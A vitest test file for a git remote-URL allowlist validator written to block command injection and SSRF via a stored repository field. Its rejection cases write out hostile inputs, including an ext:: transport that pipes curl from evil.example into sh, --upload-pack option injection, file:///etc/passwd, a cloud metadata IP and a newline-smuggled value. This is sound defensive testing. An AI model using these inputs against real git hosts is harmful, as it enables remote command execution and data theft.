/**
 * #561 — `Memory.source` allowlist.
 *
 * The column reaches `git` as a remote URL, and git reads a remote URL as a
 * transport selector: `ext::<cmd>` runs `<cmd>` on this host, and a value
 * starting with `-` is read as an option (`--upload-pack=<cmd>`) rather than as
 * a URL. Both are command execution from a caller-settable string, which is why
 * the accepted set is spelled out here rather than inferred from what happened
 * to work.
 *
 * The rejection cases are the point of this file. The acceptance cases exist to
 * pin that the fix costs nothing that works today — they are the exact shapes
 * measured in dev and prod on 2026-09-08 (12 rows each, all
 * `https://github.com/<owner>/<repo>[.git]`).
 */
import { describe, it, expect } from 'vitest';
import { validateMemorySource, GitSourceError } from './gitSource.js';

const accepted = [
  // Every shape that exists in dev or prod today.
  'https://github.com/hadron-memory/hadronmem-core',
  'https://github.com/hadron-memory/hadronmem-mcp.git',
  'https://github.com/micromentor-team/hadronmem-mm-app',
  'https://github.com/baragaun/hadronmem-bg-node-client',
  // Documented in toHttpsUrl and used by the sync fixtures; no stored row uses
  // it, so it is preserved capability rather than live traffic.
  'git@github.com:test/repo.git',
  'git@github.com:owner/repo',
  // GitHub name characters that are legal and easy to over-reject.
  'https://github.com/some.org/repo.with.dots',
  'https://github.com/o_wner/re_po-1',
  'https://github.com/owner/repo/',
];

const rejected: [string, string][] = [
  // ── The issue, exactly as filed ──
  ["ext:: transport", "ext::sh -c 'curl evil.example/x|sh'"],
  ['ext:: with no space', 'ext::whoami'],
  // ── The same escape through git's option parser ──
  ['leading dash', '--upload-pack=sh -c id'],
  ['leading dash, github-looking', '--upload-pack=id https://github.com/o/r'],
  // ── Other transports git would happily use ──
  ['file url', 'file:///etc/passwd'],
  ['bare local path', '/tmp/evil-repo'],
  ['relative path', '../../etc'],
  ['git protocol', 'git://github.com/owner/repo.git'],
  ['ssh url form', 'ssh://git@github.com/owner/repo.git'],
  ['http, not https', 'http://github.com/owner/repo'],
  // ── The SSRF half: right scheme, wrong host ──
  ['host lookalike', 'https://github.com.evil.example/owner/repo'],
  ['subdomain lookalike', 'https://evil.github.com/owner/repo'],
  ['internal host', 'https://169.254.169.254/owner/repo'],
  ['credentials in the authority', 'https://user:pw@github.com/owner/repo'],
  // ── Shapes that are github.com but not a repository ──
  ['too few segments', 'https://github.com/owner'],
  ['too many segments', 'https://github.com/owner/repo/tree/main'],
  ['traversal as a segment', 'https://github.com/owner/..'],
  ['traversal as the owner', 'https://github.com/../repo'],
  ['empty', ''],
  ['whitespace', '  '],
  ['trailing newline smuggling a second value', 'https://github.com/o/r\next::id'],
];

describe('validateMemorySource', () => {
  it.each(accepted)('accepts %s', (source) => {
    expect(() => validateMemorySource(source)).not.toThrow();
  });

  it.each(rejected)('rejects %s', (_label, source) => {
    expect(() => validateMemorySource(source)).toThrow(GitSourceError);
  });

  it('accepts null and undefined — a memory with no repository is DB-only', () => {
    expect(() => validateMemorySource(null)).not.toThrow();
    expect(() => validateMemorySource(undefined)).not.toThrow();
  });

  it('names both accepted spellings in the refusal, so the caller can retype it', () => {
    // A refusal that only says "invalid" makes the caller guess, and the two
    // accepted forms are not guessable from the rejected value.
    expect(() => validateMemorySource('ext::id')).toThrow(/https:\/\/github\.com\/<owner>\/<repo>/);
    expect(() => validateMemorySource('ext::id')).toThrow(/git@github\.com:<owner>\/<repo>/);
  });
});
